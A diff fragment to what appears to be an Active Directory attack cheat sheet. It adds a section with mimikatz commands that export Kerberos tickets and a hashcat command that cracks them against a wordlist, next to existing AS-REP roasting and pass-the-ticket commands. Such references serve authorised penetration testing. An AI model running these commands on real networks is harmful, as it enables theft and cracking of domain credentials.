@@ -36,6 +36,14 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 # check ASREPRoast for a list of users (no credentials required)
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
+
+### Extracting & Crack Tickets
+
+```
+mimikatz#  kerberos::list /export
+hashcat -m18200  <ticket.kirbi> rockyou.txt
+```
+
 ## Pass the Ticket w/ mimikatz
 ```shell
 mimikatz.exe
